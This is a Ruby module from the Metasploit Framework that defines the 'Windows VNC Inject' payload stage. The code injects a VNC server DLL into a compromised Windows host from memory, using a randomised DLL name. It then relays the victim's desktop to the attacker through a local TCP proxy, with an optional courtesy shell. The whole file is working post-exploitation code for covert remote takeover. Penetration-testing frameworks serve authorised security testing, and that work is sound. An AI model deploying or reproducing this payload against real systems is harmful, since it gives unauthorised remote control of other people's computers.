##
# $Id:$
##

##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/projects/Framework/
##


require 'msf/core'
require 'msf/core/payload/windows/dllinject'
require 'msf/base/sessions/vncinject'

module Msf
module Payloads
module Stages
module Windows

###
#
# Injects the VNC server DLL and runs it over the established connection.
#
###
module VncInject

	include Msf::Payload::Windows::DllInject

	def initialize(info = {})
		super(update_info(info,
			'Name'          => 'Windows VNC Inject',
			'Version'       => '$Revision$',
			'Description'   => 'Inject the VNC server DLL and run it from memory',
			'Author'        => [ 'skape', 'jt <jt@klake.org>' ],
			'License'       => MSF_LICENSE,
			'Session'       => Msf::Sessions::VncInject))

		sep = File::SEPARATOR

		# Override the DLL path with the path to the meterpreter server DLL
		register_options(
			[
				OptPath.new('DLL', 
					[ 
						true, 
						"The local path to the VNC DLL to upload", 
						File.join(Msf::Config.install_root, "data", "vncdll.dll")
					]),
				OptPort.new('VNCPORT',
					[
						true,
						"The local port to use for the VNC proxy",
						5900
					]),
				OptAddress.new('VNCHOST',
					[
						true,
						"The local host to use for the VNC proxy",
						'127.0.0.1'
					]),
				OptBool.new('AUTOVNC',
					[
						true,
						"Automatically launch VNC viewer if present",
						true
					])
			], VncInject)

		register_advanced_options(
			[
				OptBool.new('DisableCourtesyShell',
					[
						false,
						"Disables the Metasploit Courtesy shell",
						false
					])
			], VncInject)

		# Don't let people set the library name option
		options.remove_option('LibraryName')
	end

	#
	# The library name that we're injecting the DLL as can be random.
	#
	def library_name
		Rex::Text::rand_text_alpha(8) + ".dll"
	end

	#
	# If the AUTOVNC flag is set to true, automatically try to launch VNC
	# viewer.
	#
	def on_session(session)
		# Calculate the flags to send to the DLL
		flags = 0

		flags |= 1 if (datastore['DisableCourtesyShell'])

		# Transmit the one byte flag
		session.rstream.put([ flags ].pack('C'))

		# Set up the local relay
		print_status("Starting local TCP relay on #{datastore['VNCHOST']}:#{datastore['VNCPORT']}...")

		session.setup_relay(datastore['VNCPORT'], datastore['VNCHOST'])

		print_status("Local TCP relay started.")

		# If the AUTOVNC flag is set, launch VNC viewer.
		if (datastore['AUTOVNC'] == true)
			if (session.autovnc)
				print_status("Launched vnciewer in the background.")
			end
		end
		
		super
	end

end

end end end end
